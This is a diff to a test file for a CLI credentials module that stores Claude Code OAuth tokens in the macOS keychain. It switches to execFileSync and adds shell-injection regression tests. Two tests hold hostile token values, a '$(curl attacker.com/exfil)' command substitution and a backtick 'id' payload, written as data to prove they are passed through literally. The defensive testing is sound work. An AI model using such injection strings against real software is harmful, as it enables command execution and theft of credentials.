@@ -4,6 +4,7 @@ import path from "node:path";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
 const execSyncMock = vi.fn();
+const execFileSyncMock = vi.fn();
 
 describe("cli credentials", () => {
   beforeEach(() => {
@@ -13,18 +14,15 @@ describe("cli credentials", () => {
   afterEach(async () => {
     vi.useRealTimers();
     execSyncMock.mockReset();
+    execFileSyncMock.mockReset();
     delete process.env.CODEX_HOME;
     const { resetCliCredentialCachesForTest } = await import("./cli-credentials.js");
     resetCliCredentialCachesForTest();
   });
 
   it("updates the Claude Code keychain item in place", async () => {
-    const commands: string[] = [];
-
     execSyncMock.mockImplementation((command: unknown) => {
       const cmd = String(command);
-      commands.push(cmd);
-
       if (cmd.includes("find-generic-password")) {
         return JSON.stringify({
           claudeAiOauth: {
@@ -34,9 +32,10 @@ describe("cli credentials", () => {
           },
         });
       }
-
       return "";
     });
+
+    execFileSyncMock.mockReturnValue("");
 
     const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");
 
@@ -46,14 +45,97 @@ describe("cli credentials", () => {
         refresh: "new-refresh",
         expires: Date.now() + 60_000,
       },
-      { execSync: execSyncMock },
+      { execSync: execSyncMock, execFileSync: execFileSyncMock },
     );
 
     expect(ok).toBe(true);
-    expect(commands.some((cmd) => cmd.includes("delete-generic-password"))).toBe(false);
 
-    const updateCommand = commands.find((cmd) => cmd.includes("add-generic-password"));
-    expect(updateCommand).toContain("-U");
+    // Verify execFileSync was called with array args (no shell interpretation)
+    expect(execFileSyncMock).toHaveBeenCalledTimes(1);
+    const [binary, args] = execFileSyncMock.mock.calls[0];
+    expect(binary).toBe("security");
+    expect(args).toContain("add-generic-password");
+    expect(args).toContain("-U");
+  });
+
+  it("prevents shell injection via malicious OAuth token values", async () => {
+    const maliciousToken = "x'$(curl attacker.com/exfil)'y";
+
+    execSyncMock.mockImplementation((command: unknown) => {
+      const cmd = String(command);
+      if (cmd.includes("find-generic-password")) {
+        return JSON.stringify({
+          claudeAiOauth: {
+            accessToken: "old-access",
+            refreshToken: "old-refresh",
+            expiresAt: Date.now() + 60_000,
+          },
+        });
+      }
+      return "";
+    });
+
+    execFileSyncMock.mockReturnValue("");
+
+    const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");
+
+    const ok = writeClaudeCliKeychainCredentials(
+      {
+        access: maliciousToken,
+        refresh: "safe-refresh",
+        expires: Date.now() + 60_000,
+      },
+      { execSync: execSyncMock, execFileSync: execFileSyncMock },
+    );
+
+    expect(ok).toBe(true);
+
+    // The -w argument must contain the malicious string literally, not shell-expanded
+    const [, args] = execFileSyncMock.mock.calls[0];
+    const wIndex = (args as string[]).indexOf("-w");
+    const passwordValue = (args as string[])[wIndex + 1];
+    expect(passwordValue).toContain(maliciousToken);
+    // Verify it was passed as a direct argument, not built into a shell command string
+    expect(execFileSyncMock.mock.calls[0][0]).toBe("security");
+  });
+
+  it("prevents shell injection via backtick command substitution in tokens", async () => {
+    const backtickPayload = "token`id`value";
+
+    execSyncMock.mockImplementation((command: unknown) => {
+      const cmd = String(command);
+      if (cmd.includes("find-generic-password")) {
+        return JSON.stringify({
+          claudeAiOauth: {
+            accessToken: "old-access",
+            refreshToken: "old-refresh",
+            expiresAt: Date.now() + 60_000,
+          },
+        });
+      }
+      return "";
+    });
+
+    execFileSyncMock.mockReturnValue("");
+
+    const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");
+
+    const ok = writeClaudeCliKeychainCredentials(
+      {
+        access: "safe-access",
+        refresh: backtickPayload,
+        expires: Date.now() + 60_000,
+      },
+      { execSync: execSyncMock, execFileSync: execFileSyncMock },
+    );
+
+    expect(ok).toBe(true);
+
+    // Backtick payload must be passed literally, not interpreted
+    const [, args] = execFileSyncMock.mock.calls[0];
+    const wIndex = (args as string[]).indexOf("-w");
+    const passwordValue = (args as string[])[wIndex + 1];
+    expect(passwordValue).toContain(backtickPayload);
   });
 
   it("falls back to the file store when the keychain update fails", async () => {
